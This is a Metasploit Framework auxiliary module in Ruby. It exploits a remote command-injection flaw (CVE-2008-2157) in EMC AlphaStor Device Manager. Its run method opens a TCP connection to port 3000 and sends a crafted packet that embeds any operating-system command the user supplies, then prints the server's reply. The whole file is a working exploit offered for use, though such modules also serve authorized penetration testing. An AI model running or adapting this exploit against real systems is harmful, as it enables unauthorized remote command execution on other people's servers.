##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EMC AlphaStor Device Manager Arbitrary Command Execution',
			'Description'    => %q{
					EMC AlphaStor Device Manager is prone to a remote command-injection vulnerability
					because the application fails to properly sanitize user-supplied input.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=703' ],
					[ 'OSVDB', '45715' ],
					[ 'CVE', '2008-2157' ],
					[ 'BID', '29398' ],
				],
			'DisclosureDate' => 'May 27 2008'))

			register_options(
				[
					Opt::RPORT(3000),
					OptString.new('CMD', [ false, 'The OS command to execute', 'hostname']),
				], self.class)
	end

	def run
		connect

		data = "\x75" + datastore['CMD']
		pad  = "\x00" * 512

		pkt = data + pad

		print_status("Sending command: #{datastore['CMD']}")
		sock.put(pkt)

		# try to suck it all in.
		select(nil,nil,nil,5)

		res = sock.get_once || ''

		res.each_line do |info|
			print_status("#{info.gsub(/[^[:print:]]+/,"")}") # hack.
		end

		disconnect

	end
end
